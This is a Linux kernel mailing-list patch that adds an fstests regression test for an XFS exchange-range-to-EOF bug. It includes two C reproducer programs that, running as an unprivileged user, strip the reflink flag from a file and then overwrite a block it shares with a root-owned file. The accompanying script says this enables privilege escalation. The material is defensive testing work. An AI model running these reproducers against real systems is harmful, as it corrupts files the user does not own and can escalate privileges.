Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7FC5545039;
	Tue, 13 Oct 2026 00:09:53 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791850195; cv=none; b=FpGcBZkaJMPXiqzWzXczkcfMrlxy/u1bWVGqUKgsLQfnlOdN23JT73+OxeivHynBpYN0ryvqLBTi/B3H7iWL8DPn34kOr/YPZHLMZlCdmoB1oNZfx1Aq93OME4WgXgWJq2kmFJTvyBX4mu0bvlV7HEdMkeB2VI+OlNpsjhygQbs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791850195; c=relaxed/simple;
	bh=bsGiCVzWF1ndNWUnB0NKtKdrbkRxDDmJ2IoWv95QhNs=;
	h=Date:Subject:From:To:Cc:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type; b=ddMHDZ5JXTAdSzj4WUrgsn3WQHs7y/869ps18W9JAn+WvJHeU29ixClxkfKRlmOW0z7eXjFxqXVskUiwmj8swPu6K5AvNCNexHee0DkDstgV/N1NoyyHHkatyxIRmh7f7gxs4veJQliAcdHm8Foq1y7lfps36HU2F4efs/PRo+U=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=AJvXnkef; arc=none smtp.client-ip=100.103.45.18
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="AJvXnkef"
Received: by smtp.kernel.org (Postfix) with UTF8SMTPSA id 545A51F0089B;
	Tue, 13 Oct 2026 00:09:53 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
	s=k20260515; t=1791850193;
	bh=jDAV/p3nAWbS3UfHkPShEFlu6EB4tfk7OVmj9NNP/2Y=;
	h=Date:Subject:From:To:Cc:In-Reply-To:References;
	b=AJvXnkefik4pkXogahyOSk7yss8Po2pffQC/mJGWbkQCkJriBX3TEacI4xvdFuX2v
	 0p5f6L1yGEo1+oAl7P99xj8Ab0Wxks2wRMgzuJwLicIbcUL1pcfQH0IuGyzXRcPXaA
	 BsxSBxLKcdRUF4WUl78cXL+gj6DkV2Of8llSC6/hp9lbYHPTvJD6FoljcfnylcWM1z
	 MusoeCdxUfbX9s4tvH7ucZ7pzwdQxPPO9CZfRmU73nMaASwN9RskXomcz0TGr+50ns
	 j3UJfDWgMu+GgynsR7y/kbNlHvDmF69wZh29RazRIjUc/eMLd5u8RTSD0tbFYqeMuE
	 Yc2iYiUS0eTZg==
Date: Mon, 12 Oct 2026 17:09:52 -0700
Subject: [PATCH 5/6] xfs: add regression test for exchangerange-to-eof reflux
From: "Darrick J. Wong" <djwong@kernel.org>
To: djwong@kernel.org, zlang@kernel.org
Cc: norbert@doyensec.com, fstests@vger.kernel.org, linux-xfs@vger.kernel.org
Message-ID: <179185007547.1732194.10384749018435886624.stgit@frogsfrogsfrogs>
In-Reply-To: <179185007428.1732194.3790285770700324388.stgit@frogsfrogsfrogs>
References: <179185007428.1732194.3790285770700324388.stgit@frogsfrogsfrogs>
Precedence: bulk
X-Mailing-List: linux-xfs@vger.kernel.org
List-Id: <linux-xfs.vger.kernel.org>
List-Subscribe: <mailto:linux-xfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-xfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

From: Darrick J. Wong <djwong@kernel.org>

This is a regression test for a bug that Norbert Szetei reported in the
XFS exchange-range ioctl.  I've ported his reproducer program to
fstests so that everyone can run it, and added an extra test that
checks that the right thing happens if you ask the kernel to exchange
unequally sized tails of two files.

Cc: Norbert Szetei <norbert@doyensec.com>
Signed-off-by: "Darrick J. Wong" <djwong@kernel.org>
---
 .gitignore                      |    2 
 src/Makefile                    |    3 -
 src/xfs-exchange-to-dirty-eof.c |  210 +++++++++++++++++++++++++++++++++++++++
 src/xfs-exchange-to-eof.c       |  168 +++++++++++++++++++++++++++++++
 tests/generic/1958              |  138 ++++++++++++++++++++++++++
 tests/generic/1958.out          |   11 ++
 6 files changed, 531 insertions(+), 1 deletion(-)
 create mode 100644 src/xfs-exchange-to-dirty-eof.c
 create mode 100644 src/xfs-exchange-to-eof.c
 create mode 100755 tests/generic/1958
 create mode 100644 tests/generic/1958.out


diff --git a/.gitignore b/.gitignore
index b5d85c9451f0a8..cdcfa06e111974 100644
--- a/.gitignore
+++ b/.gitignore
@@ -186,6 +186,8 @@ tags
 /src/uuid_ioctl
 /src/writemod
 /src/writev_on_pagefault
+/src/xfs-exchange-to-eof
+/src/xfs-exchange-dirty-to-eof
 /src/xfsctl
 /src/xfsfind
 /src/aio-dio-regress/aio-dio-append-write-fallocate-race
diff --git a/src/Makefile b/src/Makefile
index 04a73b76546241..211b16a832ad5d 100644
--- a/src/Makefile
+++ b/src/Makefile
@@ -36,7 +36,8 @@ LINUX_TARGETS = xfsctl bstat t_mtab getdevicesize preallo_rw_pattern_reader \
 	fscrypt-crypt-util bulkstat_null_ocount splice-test chprojid_fail \
 	detached_mounts_propagation ext4_resize t_readdir_3 splice2pipe \
 	uuid_ioctl t_snapshot_deleted_subvolume fiemap-fault min_dio_alignment \
-	rw_hint btrfs_ioctl refluxfs
+	rw_hint btrfs_ioctl refluxfs xfs-exchange-to-eof \
+	xfs-exchange-to-dirty-eof
 
 EXTRA_EXECS = dmerror fill2attr fill2fs fill2fs_check scaleread.sh \
 	      btrfs_crc32c_forged_name.py popdir.pl popattr.py \
diff --git a/src/xfs-exchange-to-dirty-eof.c b/src/xfs-exchange-to-dirty-eof.c
new file mode 100644
index 00000000000000..2b0497c027707f
--- /dev/null
+++ b/src/xfs-exchange-to-dirty-eof.c
@@ -0,0 +1,210 @@
+// SPDX-License-Identifier: GPL-2.0
+/*
+ * Clears XFS_DIFLAG2_REFLINK from a file that still owns a shared block, on a
+ * kernel carrying "xfs: fix exchange-range-to-eof file size exchange".
+ *
+ * Needs reflink=1 and exchange=1, and a readable file called "peer" in the
+ * current directory.  Brackets are physical block numbers from FIEMAP.
+ * Exits 0 if peer was rewritten, 1 if it survived, 2 on a setup error.
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <sys/vfs.h>
+#include <linux/fs.h>
+#include <linux/fiemap.h>
+#include <errno.h>
+
+#ifndef FICLONERANGE
+#define FICLONERANGE _IOW(0x94, 13, struct file_clone_range)
+#endif
+
+#ifndef XFS_EXCHANGE_RANGE_TO_EOF
+struct xfs_exchange_range {
+	__s32		file1_fd;
+	__u32		pad;
+	__u64		file1_offset;
+	__u64		file2_offset;
+	__u64		length;
+	__u64		flags;
+};
+#define XFS_IOC_EXCHANGE_RANGE		_IOW('X', 129, struct xfs_exchange_range)
+#define XFS_EXCHANGE_RANGE_TO_EOF	(1ULL << 0)
+#endif
+
+static unsigned long blksz;
+static int peer, f1;
+
+static unsigned long long phys(int fd, unsigned long long off)
+{
+	struct { struct fiemap f; struct fiemap_extent e[1]; } q;
+
+	memset(&q, 0, sizeof q);
+	q.f.fm_start = off;
+	q.f.fm_length = blksz;
+	q.f.fm_extent_count = 1;
+	if (ioctl(fd, FS_IOC_FIEMAP, &q.f) || q.f.fm_mapped_extents < 1)
+		return 0;
+	return (q.e[0].fe_physical + (off - q.e[0].fe_logical)) / blksz;
+}
+
+static void show(const char *tag)
+{
+	struct stat st;
+	int i;
+
+	fstat(f1, &st);
+	printf("%-28s peer [%llu]   file1 isize %5lld  [", tag, phys(peer, 0),
+	       (long long)st.st_size);
+	for (i = 0; i < 3; i++)
+		printf("%llu%s", phys(f1, (unsigned long long)i * blksz),
+		       i == 2 ? "]\n" : "] [");
+}
+
+/* fsync == 0 leaves every block dirty, so i_disk_size stays 0 */
+static int mkfile(const char *name, char fill, int blocks, int do_fsync)
+{
+	char *buf;
+	int fd;
+
+	unlink(name);
+	fd = open(name, O_RDWR | O_CREAT | O_EXCL, 0600);
+	if (fd < 0)
+		return fprintf(stderr, "open %s: %m\n", name), -1;
+	buf = malloc((size_t)blocks * blksz);
+	memset(buf, fill, (size_t)blocks * blksz);
+	if (pwrite(fd, buf, (size_t)blocks * blksz, 0) !=
+	    (ssize_t)((size_t)blocks * blksz))
+		return fprintf(stderr, "pwrite %s: %m\n", name), -1;
+	free(buf);
+	if (do_fsync)
+		fsync(fd);
+	return fd;
+}
+
+static int exchange(int fd2, int fd1, unsigned long long off1,
+		    unsigned long long off2, unsigned long long len,
+		    unsigned long long flags, const char *what)
+{
+	struct xfs_exchange_range xr;
+
+	memset(&xr, 0, sizeof xr);
+	xr.file1_fd = fd1;
+	xr.file1_offset = off1;
+	xr.file2_offset = off2;
+	xr.length = len;
+	xr.flags = flags;
+	if (ioctl(fd2, XFS_IOC_EXCHANGE_RANGE, &xr)) {
+		fprintf(stderr, "%s: %m\n", what);
+		return -1;
+	}
+	return 0;
+}
+
+int main(int argc, char *argv[])
+{
+	struct file_clone_range cr;
+	char before[65536], after[65536], *buf;
+	struct statfs sfs;
+	struct stat st;
+	int dirty, d2;
+
+	if (argc != 3) {
+		fprintf(stderr, "Usage: $0 dir path_to_peer\n");
+		return 2;
+	}
+
+	if (chdir(argv[1]))
+		return perror(argv[1]), 2;
+
+	if (statfs(".", &sfs))
+		return fprintf(stderr, "statfs: %m\n"), 2;
+	blksz = sfs.f_bsize;
+	if (blksz < 512 || blksz > 65536)
+		return fprintf(stderr, "unexpected block size %lu\n", blksz), 2;
+
+	peer = open(argv[2], O_RDONLY);
+	if (peer < 0)
+		return fprintf(stderr, "open peer: %m\n"), 2;
+	if (fstat(peer, &st))
+		return fprintf(stderr, "fstat peer: %m\n"), 2;
+	printf("peer uid %u mode 0%o size %lld, block size %lu\n",
+	       st.st_uid, st.st_mode & 07777, (long long)st.st_size, blksz);
+	if ((unsigned long)st.st_size < blksz)
+		return fprintf(stderr,
+			"peer must be at least one block\n"), 2;
+	if (pread(peer, before, blksz, 0) != (ssize_t)blksz)
+		return fprintf(stderr, "pread peer: %m\n"), 2;
+	syncfs(peer);
+
+	/* file1: three blocks, clean, so its own i_disk_size is honest */
+	f1 = mkfile("file1", 'A', 3, 1);
+	if (f1 < 0)
+		return 2;
+	/* the lever: one block, entirely dirty, i_disk_size == 0 */
+	dirty = mkfile("dirty", 'D', 1, 0);
+	if (dirty < 0)
+		return 2;
+	d2 = mkfile("donor2", 'E', 1, 1);
+	if (d2 < 0)
+		return 2;
+	printf("\n");
+	show("start");
+
+	/* share peer's block into file1's middle block */
+	memset(&cr, 0, sizeof cr);
+	cr.src_fd = peer;
+	cr.src_offset = 0;
+	cr.src_length = blksz;
+	cr.dest_offset = blksz;
+	if (ioctl(f1, FICLONERANGE, &cr)) {
+		fprintf(stderr, "FICLONERANGE: %m\n");
+		if (errno == EOPNOTSUPP)
+			fprintf(stderr,
+				"this filesystem needs reflink=1, check xfs_info\n");
+		return 2;
+	}
+	show("1 FICLONERANGE");
+
+	/*
+	 * ip1 = file1, ip2 = dirty.  off2 == i_size(dirty) == blksz, so
+	 *	length = max(3*blksz - 2*blksz, blksz - blksz) = blksz
+	 * and dirty's flush range [blksz, 2*blksz) is entirely past its EOF,
+	 * so its page cache is never written back and i_disk_size stays 0:
+	 *	isize1 = 2*blksz + (0 - blksz) = blksz
+	 * file1's ondisk size becomes one block while it still owns the
+	 * shared block at offset blksz.
+	 */
+	if (exchange(dirty, f1, 2 * blksz, blksz, 0,
+		     XFS_EXCHANGE_RANGE_TO_EOF, "exchange TO_EOF"))
+		return 2;
+	show("2 EXCHANGE_RANGE TO_EOF");
+
+	/*
+	 * By i_disk_size file1 is now a one-block file, so this looks like a
+	 * full-contents exchange of two one-block files and
+	 * xmi_can_exchange_reflink_flags() clears the flag.
+	 */
+	if (exchange(f1, d2, 0, 0, blksz, 0, "exchange flag-clear"))
+		return 2;
+	show("3 EXCHANGE_RANGE");
+
+	/* in-place write to the still-shared block */
+	buf = malloc(blksz);
+	memset(buf, 'X', blksz);
+	if (pwrite(f1, buf, blksz, blksz) != (ssize_t)blksz)
+		return fprintf(stderr, "pwrite file1: %m\n"), 2;
+	fsync(f1);
+	show("4 pwrite(file1, blksz)");
+
+	posix_fadvise(peer, 0, 0, POSIX_FADV_DONTNEED);
+	if (pread(peer, after, blksz, 0) != (ssize_t)blksz)
+		return fprintf(stderr, "pread peer: %m\n"), 2;
+	printf("\npeer first byte %c -> %c   %s\n", before[0], after[0],
+	       memcmp(before, after, blksz) ? "PEER REWRITTEN" : "peer intact");
+	return memcmp(before, after, blksz) ? 0 : 1;
+}
diff --git a/src/xfs-exchange-to-eof.c b/src/xfs-exchange-to-eof.c
new file mode 100644
index 00000000000000..045bb3b97ae135
--- /dev/null
+++ b/src/xfs-exchange-to-eof.c
@@ -0,0 +1,168 @@
+// SPDX-License-Identifier: GPL-2.0
+
+// Trick exchange-range-to-EOF into screwing up the file size exchange
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <sys/vfs.h>
+#include <linux/fs.h>
+#include <linux/fiemap.h>
+#include <errno.h>
+
+#ifndef FICLONERANGE
+#define FICLONERANGE _IOW(0x94, 13, struct file_clone_range)
+#endif
+
+#ifndef XFS_EXCHANGE_RANGE_TO_EOF
+struct xfs_exchange_range {
+	__s32		file1_fd;
+	__u32		pad;
+	__u64		file1_offset;
+	__u64		file2_offset;
+	__u64		length;
+	__u64		flags;
+};
+#define XFS_IOC_EXCHANGE_RANGE		_IOW('X', 129, struct xfs_exchange_range)
+#define XFS_EXCHANGE_RANGE_TO_EOF	(1ULL << 0)
+#endif
+
+static unsigned long blksz;
+static int peer, f1;
+
+static unsigned long long phys(int fd, unsigned long long off)
+{
+	struct { struct fiemap f; struct fiemap_extent e[1]; } q;
+
+	memset(&q, 0, sizeof q);
+	q.f.fm_start = off;
+	q.f.fm_length = blksz;
+	q.f.fm_extent_count = 1;
+	if (ioctl(fd, FS_IOC_FIEMAP, &q.f) || q.f.fm_mapped_extents < 1)
+		return 0;
+	return (q.e[0].fe_physical + (off - q.e[0].fe_logical)) / blksz;
+}
+
+static void show(const char *tag)
+{
+	struct stat st;
+	int i;
+
+	fstat(f1, &st);
+	printf("%-26s peer [%llu]   file1 size %5lld  [", tag, phys(peer, 0),
+	       (long long)st.st_size);
+	for (i = 0; i < 3; i++)
+		printf("%llu%s", phys(f1, (unsigned long long)i * blksz),
+		       i == 2 ? "]\n" : "] [");
+}
+
+static int mkfile(const char *name, char fill, int blocks)
+{
+	char *buf;
+	int fd;
+
+	unlink(name);
+	fd = open(name, O_RDWR | O_CREAT | O_EXCL, 0600);
+	if (fd < 0)
+		return fprintf(stderr, "open %s: %m\n", name), -1;
+	buf = malloc(blocks * blksz);
+	memset(buf, fill, blocks * blksz);
+	if (pwrite(fd, buf, blocks * blksz, 0) != (ssize_t)(blocks * blksz))
+		return fprintf(stderr, "pwrite %s: %m\n", name), -1;
+	free(buf);
+	fsync(fd);
+	return fd;
+}
+
+int main(int argc, char *argv[])
+{
+	struct xfs_exchange_range xr;
+	struct file_clone_range cr;
+	char before[65536], after[65536], *buf;
+	struct statfs sfs;
+	struct stat st;
+	int d1, d2;
+
+	if (argc != 3) {
+		fprintf(stderr, "Usage: $0 dir path_to_peer\n");
+		return 2;
+	}
+
+	if (chdir(argv[1]))
+		return perror(argv[1]), 2;
+
+	if (statfs(".", &sfs))
+		return fprintf(stderr, "statfs: %m\n"), 2;
+	blksz = sfs.f_bsize;
+	if (blksz < 512 || blksz > 65536)
+		return fprintf(stderr, "unexpected block size %lu\n", blksz), 2;
+
+	peer = open(argv[2], O_RDONLY);
+	if (peer < 0)
+		return fprintf(stderr, "open peer %s: %m\n", argv[2]), 2;
+	syncfs(peer);		/* so FIEMAP reports peer's real blocks */
+	fstat(peer, &st);
+	printf("peer uid %u mode %04o size %lld, block size %lu\n\n",
+	       st.st_uid, st.st_mode & 07777, (long long)st.st_size, blksz);
+	if (pread(peer, before, blksz, 0) != (ssize_t)blksz)
+		return fprintf(stderr, "read peer: %m\n"), 2;
+
+	f1 = mkfile("file1", 'A', 3);
+	d1 = mkfile("donor1", 'B', 1);
+	d2 = mkfile("donor2", 'C', 1);
+	if (f1 < 0 || d1 < 0 || d2 < 0)
+		return 2;
+	show("start");
+
+	/* 1. share peer's block into the middle of file1 */
+	cr = (struct file_clone_range){ .src_fd = peer, .src_offset = 0,
+					.src_length = blksz,
+					.dest_offset = blksz };
+	if (ioctl(f1, FICLONERANGE, &cr))
+		return fprintf(stderr, "FICLONERANGE: %m\n"), 2;
+	show("1 FICLONERANGE");
+
+	/*
+	 * 2. exchange file1's last block against the whole of donor1 with
+	 * TO_EOF.  The sizes are exchanged too, so file1 claims one block
+	 * while still owning three.  file2_offset is block 2, so this exchange
+	 * cannot clear a reflink flag.
+	 */
+	xr = (struct xfs_exchange_range){ .file1_fd = d1, .file1_offset = 0,
+					  .file2_offset = 2 * blksz,
+					  .length = 0,
+					  .flags = XFS_EXCHANGE_RANGE_TO_EOF };
+	if (ioctl(f1, XFS_IOC_EXCHANGE_RANGE, &xr))
+		return fprintf(stderr, "EXCHANGE_RANGE TO_EOF: %m\n"), 2;
+	show("2 EXCHANGE_RANGE TO_EOF");
+
+	/*
+	 * 3. by i_disk_size this is a whole-file exchange of two one-block
+	 * files, so the reflink flag is handed to donor2 and cleared off
+	 * file1, which still shares a block with peer.
+	 */
+	xr = (struct xfs_exchange_range){ .file1_fd = d2, .file1_offset = 0,
+					  .file2_offset = 0, .length = blksz };
+	if (ioctl(f1, XFS_IOC_EXCHANGE_RANGE, &xr))
+		return fprintf(stderr, "EXCHANGE_RANGE: %m\n"), 2;
+	show("3 EXCHANGE_RANGE");
+
+	/* 4. write to the block file1 still shares with peer */
+	buf = malloc(blksz);
+	memset(buf, 'X', blksz);
+	if (pwrite(f1, buf, blksz, blksz) != (ssize_t)blksz)
+		return fprintf(stderr, "pwrite: %m\n"), 2;
+	fsync(f1);
+	show("4 pwrite(file1, 4096)");
+
+	posix_fadvise(peer, 0, 0, POSIX_FADV_DONTNEED);
+	if (pread(peer, after, blksz, 0) != (ssize_t)blksz)
+		return fprintf(stderr, "re-read peer: %m\n"), 2;
+	printf("\npeer first byte %c -> %c   %s\n", before[0], after[0],
+	       memcmp(before, after, blksz) ? "PEER REWRITTEN" : "peer intact");
+	return memcmp(before, after, blksz) ? 0 : 1;
+}
diff --git a/tests/generic/1958 b/tests/generic/1958
new file mode 100755
index 00000000000000..927ac75de9c039
--- /dev/null
+++ b/tests/generic/1958
@@ -0,0 +1,138 @@
+#! /bin/bash
+# SPDX-License-Identifier: GPL-2.0
+# Copyright (c) 2026 Oracle.  All Rights Reserved.
+#
+# FS QA Test No. 1958
+#
+# Regression test for an exchange-range-to-EOF bug which unintentionally
+# results in files that share data blocks but don't have the reflink flag set.
+# This enables attackers to rewrite shared blocks to gain root privileges,
+# similar to refluxfs.
+. ./common/preamble
+_begin_fstest auto quick fiexchange
+
+. ./common/filter
+. ./common/reflink
+
+_require_test_program "xfs-exchange-to-eof"
+_require_test_program "xfs-exchange-to-dirty-eof"
+_require_user fsgqa
+_require_group fsgqa
+_require_scratch_reflink
+_require_xfs_io_command exchangerange
+_require_xfs_io_command bulkstat_single
+_require_cp_reflink
+
+_fixed_by_fs_commit xfs 7dfb218c829c1a \
+	"xfs: fix exchange-range-to-eof file size exchange"
+
+_scratch_mkfs >> $seqres.full
+_scratch_mount
+
+rootdir=$SCRATCH_MNT/root
+userdir1=$SCRATCH_MNT/user1
+userdir2=$SCRATCH_MNT/user2
+blksz=$(_get_file_block_size $SCRATCH_MNT)
+
+# Fill $mnt/peer with "P", run reproducer program
+mkdir -p $rootdir $userdir1 $userdir2
+$XFS_IO_PROG -f -c "pwrite -S 0x50 0 $blksz" $rootdir/peer.copy >> $seqres.full
+$XFS_IO_PROG -f -c "pwrite -S 0x50 0 $blksz" $rootdir/peer1 >> $seqres.full
+$XFS_IO_PROG -f -c "pwrite -S 0x50 0 $blksz" $rootdir/peer2 >> $seqres.full
+sync
+
+chown $qa_user:$qa_group $userdir1 $userdir2
+chmod +r $rootdir/peer1 $rootdir/peer2
+
+_su $qa_user -c "./src/xfs-exchange-to-eof $userdir1 $rootdir/peer1" &> $tmp.out1
+_su $qa_user -c "./src/xfs-exchange-to-dirty-eof $userdir2 $rootdir/peer2" &> $tmp.out2
+
+echo "Errors from reproducer:" >> $seqres.full
+cat $tmp.out1 >> $seqres.full
+cat $tmp.out2 >> $seqres.full
+
+# Now do an exchange where the distance between the offset and EOF are
+# different for the two files.
+l1sz=12345678			# file size for lopsided1
+l2sz=1234567			# file size for lopsided2
+
+l1rem=$((l1sz % 1048576))
+l2rem=$((l2sz % 65536))
+
+l1off=$((l1sz - l1rem))		# lopsided1 size rounded down to 1M
+l2off=$((l2sz - l2rem))		# lopsided2 size rounded down to 64k
+
+$XFS_IO_PROG -f \
+	-c "pwrite -S 0x58 0 $l1off" \
+	-c "pwrite -S 0x59 $l1off $l2rem" \
+	$rootdir/lopsided1.copy >> $seqres.full
+$XFS_IO_PROG -f \
+	-c "pwrite -S 0x59 0 $l2off" \
+	-c "pwrite -S 0x58 $l2off $l1rem" \
+	$rootdir/lopsided2.copy >> $seqres.full
+
+sync # don't flush the exchange files so that we test the pre-exchange flushing
+
+$XFS_IO_PROG -f -c "pwrite -S 0x58 0 $l1sz" $rootdir/lopsided1 >> $seqres.full
+$XFS_IO_PROG -f -c "pwrite -S 0x59 0 $l2sz" $rootdir/lopsided2 >> $seqres.full
+
+$XFS_IO_PROG -c "exchangerange -d $l1off -s $l2off -t $rootdir/lopsided2" \
+	$rootdir/lopsided1 >> $seqres.full
+
+# Now exploit the broken i_disk_size logic
+$XFS_IO_PROG -f -c "pwrite -q 0 $blksz" -c fsync $rootdir/ondisk1
+$XFS_IO_PROG -f -c "pwrite -q 0 $((3 * blksz))" \
+	-c "exchangerange -s 0 -d $((3 * blksz)) $rootdir/ondisk1" \
+	$rootdir/ondisk2
+stat -c %s $rootdir/ondisk1
+ino=$(stat -c %i $rootdir/ondisk1)
+$XFS_IO_PROG -r -c "bulkstat_single $ino" $rootdir | grep bs_size
+
+# Check for file corruption
+grep -q REWRITTEN $tmp.out1 && \
+	echo "$rootdir/peer1 rewritten, filesystem corrupt!"
+grep -q REWRITTEN $tmp.out2 && \
+	echo "$rootdir/peer2 rewritten, filesystem corrupt!"
+
+cmp -s $rootdir/peer.copy $rootdir/peer1 || \
+	echo "$rootdir/peer1 changed since its snapshot, filesystem corrupt!"
+cmp -s $rootdir/peer.copy $rootdir/peer2 || \
+	echo "$rootdir/peer2 changed since its snapshot, filesystem corrupt!"
+
+stat -c '%n:%s' $rootdir/lopsided[12] | _filter_scratch
+
+cmp -s $rootdir/lopsided1.copy $rootdir/lopsided1 || \
+	echo "$rootdir/lopsided1 is wrong, filesystem corrupt"
+cmp -s $rootdir/lopsided2.copy $rootdir/lopsided2 || \
+	echo "$rootdir/lopsided2 is wrong, filesystem corrupt"
+
+# Check reflink flags
+_scratch_unmount
+_scratch_xfs_db \
+	-c "path /user1/file1" -c 'print' \
+	-c "path /user2/file1" -c 'print' \
+	| grep v3.reflink
+_scratch_mount
+
+# Check for file corruption now that we've blown away all caches
+grep -q REWRITTEN $tmp.out1 && \
+	echo "$rootdir/peer1 rewritten, filesystem corrupt!"
+grep -q REWRITTEN $tmp.out2 && \
+	echo "$rootdir/peer2 rewritten, filesystem corrupt!"
+
+cmp -s $rootdir/peer.copy $rootdir/peer1 || \
+	echo "$rootdir/peer1 changed since its snapshot, filesystem corrupt!"
+cmp -s $rootdir/peer.copy $rootdir/peer2 || \
+	echo "$rootdir/peer2 changed since its snapshot, filesystem corrupt!"
+
+stat -c '%n:%s' $rootdir/lopsided[12] | _filter_scratch
+
+cmp -s $rootdir/lopsided1.copy $rootdir/lopsided1 || \
+	echo "$rootdir/lopsided1 is wrong, filesystem corrupt"
+cmp -s $rootdir/lopsided2.copy $rootdir/lopsided2 || \
+	echo "$rootdir/lopsided2 is wrong, filesystem corrupt"
+
+stat -c %s $rootdir/ondisk1
+$XFS_IO_PROG -r -c "bulkstat_single $ino" $rootdir | grep bs_size
+
+_exit 0
diff --git a/tests/generic/1958.out b/tests/generic/1958.out
new file mode 100644
index 00000000000000..a1f8c510e95de6
--- /dev/null
+++ b/tests/generic/1958.out
@@ -0,0 +1,11 @@
+QA output created by 1958
+0
+	bs_size = 0
+SCRATCH_MNT/root/lopsided1:11589255
+SCRATCH_MNT/root/lopsided2:1990990
+v3.reflink = 1
+v3.reflink = 1
+SCRATCH_MNT/root/lopsided1:11589255
+SCRATCH_MNT/root/lopsided2:1990990
+0
+	bs_size = 0

